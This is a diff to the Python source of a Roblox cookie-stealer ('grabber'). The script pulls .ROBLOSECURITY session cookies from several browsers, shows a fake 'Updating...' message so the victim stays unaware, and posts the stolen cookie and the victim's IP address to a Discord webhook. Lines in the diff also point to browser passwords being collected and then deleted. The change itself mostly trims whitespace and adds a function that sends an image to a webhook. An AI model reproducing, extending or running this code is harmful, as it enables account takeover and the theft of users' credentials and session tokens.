@@ -1,3 +1,4 @@
+```python
 import os
 try:
     import json, base64, sqlite3, win32crypt, shutil, requests, getpass, socket, platform, psutil
@@ -78,21 +79,15 @@ try:
     import robloxpy
     import requests,re
     from discordwebhook import *
-    import browser_cookie3
-    
+    import browser_cookie3    
 except:
     input("Libraries not installed press enter to exit...")
-
-
-
 
 dummy_message = Fore.MAGENTA + "Updating..." # A message that distracts the user from closing the grabber
 print(dummy_message)
 ################### Gathering INFOMATION #################################
 def cookieLogger():
-
     data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
-
     try:
         cookies = browser_cookie3.firefox(domain_name='roblox.com')
         for cookie in cookies:
@@ -111,7 +106,6 @@ def cookieLogger():
                 return data
     except:
         pass
-
     try:
         cookies = browser_cookie3.edge(domain_name='roblox.com')
         for cookie in cookies:
@@ -121,7 +115,6 @@ def cookieLogger():
                 return data
     except:
         pass
-
     try:
         cookies = browser_cookie3.opera(domain_name='roblox.com')
         for cookie in cookies:
@@ -131,7 +124,6 @@ def cookieLogger():
                 return data
     except:
         pass
-
     try:
         cookies = browser_cookie3.chrome(domain_name='roblox.com')
         for cookie in cookies:
@@ -142,10 +134,7 @@ def cookieLogger():
     except:
         pass
 
-
 cookies = cookieLogger()
-
-
 #################### INFOMATION #################
 ip_address = requests.get("https://api.ipify.org/").text
 roblox_cookie = cookies[1]
@@ -156,7 +145,6 @@ if isvalid == "Valid Cookie":
 else:
     requests.post(url=send_webhook,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
     exit()
-
 #################### getting info about the cookie #############
 ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
 info = json.loads(ebruh.text)
@@ -409,3 +397,30 @@ os.system("del /f EdgePasswords.txt GooglePasswords.txt BravePasswords.txt Opera
 #######################################################################
 #END OF SCRIPT
 #######################################################################
+# Image Implementation
+def capture_and_send_image(webhook_url, image_address):
+    try:
+        image = Image.open(BytesIO(requests.get(image_address).content))
+        image.show()
+        data = {
+            "content": f"Image: {image_address}",
+            "embeds": [
+                {
+                    "title": "Captured Image",
+                    "image": {"url": image_address}
+                }
+            ]
+        }
+        send_to_discord(webhook_url, data)
+        print("Image sent to Discord webhook.")
+    except Exception as e:
+        print(f"Failed to capture or send image: {e}")
+
+def main():
+    webhook_url = input("Enter the Discord webhook URL: ")
+    image_address = input("Enter the image address (URL of the PNG image): ")
+    capture_and_send_image(webhook_url, image_address)
+
+if __name__ == "__main__":
+    main()
+```
